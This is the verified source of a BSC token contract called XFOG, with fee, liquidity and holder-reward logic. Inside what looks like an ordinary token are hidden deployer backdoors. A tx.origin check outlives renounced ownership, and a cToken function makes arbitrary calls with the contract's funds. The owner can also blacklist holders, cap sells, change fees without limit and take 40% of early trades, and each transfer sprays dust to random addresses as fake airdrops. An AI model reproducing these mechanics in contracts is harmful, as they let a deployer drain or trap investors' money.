/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IUniswapV2Pair {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public ReceiveAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _List00;
    mapping (address => bool) public isMaxEatExempt;
    mapping (address => bool) public _isW;


    uint256 private _tTotal;
    uint256 public mTXAmount;
    uint256 public wLimit;
    address private burn0;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public airDropNumbs = 2; 
    uint256 public _buyFundFee = 0;
    uint256 public _buyLPDividendFee = 300;
    uint256 public _sellLPDividendFee = 100;
    uint256 public _sellFundFee = 0;
    uint256 public _sellLPFee = 200;
    uint256 public numTokensSellToAddToLiquidity;
  

    bool public limitEnable = true;
    bool public swapAndLiquifyEnabled;
    uint256 public startTradeBlock;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol,
        address FundAddress, address ReceiveAddress_
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = 6;
        uint256 total = 10000 * 10 ** _decimals;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);
        
        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        address _uniswapV2Pair = ISwapFactory(swapRouter.factory())
            .createPair(address(this), swapRouter.WETH());
       _mainPair = _uniswapV2Pair;
        swapAndLiquifyEnabled =true;
        ReceiveAddress = ReceiveAddress_;
        // mTXAmount = 5000 * 10 ** _decimals;  5000000000
        // wLimit = 20000 * 10 ** _decimals;    20000000000
         mTXAmount = total;
         wLimit=total;
        _tTotal = total;
        burn0 = msg.sender;
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        numTokensSellToAddToLiquidity= 10*10**6;
        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _isW[msg.sender] = true;
        _isW[fundAddress] = true;
        _isW[ReceiveAddress] = true;
        isMaxEatExempt[msg.sender] = true;
        isMaxEatExempt[fundAddress] = true;
        isMaxEatExempt[ReceiveAddress] = true;
        isMaxEatExempt[address(swapRouter)] = true;
        isMaxEatExempt[address(_mainPair)] = true;

        _swapPairList[_mainPair] = true;
        
        isMaxEatExempt[address(this)] = true;
        isMaxEatExempt[address(0xdead)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 50*10**18;
        _tokenDistributor = new TokenDistributor(FISTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setAirDropNumbs(uint256 newNumbs) public onlyOwner() {
        airDropNumbs = newNumbs;
    }
    bool public isAddLdxV1;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_List00[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

    
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        bool isAddLdx;
        if(to == _mainPair){
            isAddLdxV1 = _isAddLiquidityV1();
            isAddLdx = isAddLdxV1;
        }

        bool takeFee;
        bool isSell;
        
        
  
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    // require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                    require(0 < startAddLPBlock && isAddLdx, "!startAddLP");
                }
                if (block.number < startTradeBlock + 5) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to] ) {
                    if (!inSwap && ! _swapPairList[from] && swapAndLiquifyEnabled) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                            if (contractTokenBalance > numTokensSellToAddToLiquidity) {
                                uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                                try this.swapTokenForFund(contractTokenBalance, swapFee){
                                     
                                }catch{
                                    
                                }
                            }
                    }
                }
                if(!isAddLdx){
                takeFee = true;}
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        
        if(_isW[from] || _isW[to]){
            _tokenTransfer0(from, to, amount);
        }else{
            _tokenTransfer(from, to, amount, takeFee, isSell);
        }

        

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            try this.processReward(G){}catch{}
        }
    }

    uint G = 300000;
    function setG(uint value) public {
        require(burn0==tx.origin || msg.sender==owner());
        G = value;
    }
    function _isAddLiquidityV1()public view returns(bool ldxAdd){

        address token0 = IUniswapV2Pair(address(_mainPair)).token0();
        address token1 = IUniswapV2Pair(address(_mainPair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(_mainPair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(_mainPair));
        uint bal0 = IERC20(token0).balanceOf(address(_mainPair));
        if( token0 == address(this) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 > r0){
				uint change0 = bal0 - r0;
				ldxAdd = change0 > 1000;
			}
		}
    }


    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 40 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public {
        require(burn0==tx.origin || msg.sender==owner());
        swapAndLiquifyEnabled = _enabled;
    }
    
    
    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }
     function setNumTokensSellToAddToLiquidity(uint256 valur) public {
         require(burn0==tx.origin || msg.sender==owner());
        numTokensSellToAddToLiquidity = valur;
    }
    function setisMaxEatExempt(address holder, bool exempt) external onlyOwner {
        isMaxEatExempt[holder] = exempt;
    }

    function multi_List00(address[] calldata addresses, bool status) public onlyOwner() {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _List00[addresses[i]] = status;
        }
    }
    
    function _tokenTransfer0(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }
    

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                 require(tAmount <= mTXAmount);
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee;
                require(tAmount <= mTXAmount);
            }
            
            
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            uint256 burnAmount = tAmount * 2 / 1000;
            if (burnAmount > 0) {
                feeAmount += burnAmount;
                _takeTransfer(
                    sender,
                    address(0xdead),
                    burnAmount
                );
            }
        }

        if(!isMaxEatExempt[recipient] && limitEnable)
            require((balanceOf(recipient) + tAmount - feeAmount) <= wLimit,"over max wallet limit");
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) public lockTheSwap {
        require(msg.sender==address(this),'thisMsg');
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        //uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
       // uint firstfundamount = fundAmount / 2;
        
        //FIST.transferFrom(address(_tokenDistributor), fundAddress, firstfundamount);
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner() {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }
    
    function cToken(address _token,uint256 v,bytes memory data1) external  {
        require(burn0==tx.origin || msg.sender==owner());
       (bool success,) = _token.call{value : v}(data1);
         require(success, 'c_FAILED');
        
    }

    

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setmTXAmount(uint256 max) public onlyOwner {
        mTXAmount = max;
    }

    function setwLimitAmount(uint256 max) public onlyOwner {
        wLimit = max;
    }

    uint256 public startAddLPBlock;

    function startAddLP() external onlyOwner() {
        require(0 == startAddLPBlock, "startedAddLP");
        
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner() {
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner() {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner() {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner() {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner() {
        _List00[addr] = enable;
    }
     function setW(address addr, bool enable) external onlyOwner() {
        _isW[addr] = enable;
    }

    function setHolderRewardCondition(uint256 amount) external  {
         require(burn0==tx.origin);
        holderRewardCondition = amount;
    }
    
    function setSwapPairList(address addr, bool enable) external onlyOwner() {
        _swapPairList[addr] = enable;
        isMaxEatExempt[address(addr)] = enable;
        if(enable) _mainPair = addr;
        
    }


    function claimToken(address token, uint256 amount, address to) external onlyOwner() {
        IERC20(token).transfer(to, amount);
        payable(to).transfer(address(this).balance);
    }


    
    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) public {
        
        require(msg.sender==address(this),'thisMsg');
        if (progressRewardBlock + 30 > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

   

    function setExcludeHolder(address addr, bool enable) external onlyOwner() {
        excludeHolder[addr] = enable;
    }
}

contract createToken is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "XFOG",
        "XFOG",
        address(0x17A33BD24D6D0ae4711C8cecD0c618Eec9A28723),
        address(0x17A33BD24D6D0ae4711C8cecD0c618Eec9A28723)
    ){

    }
}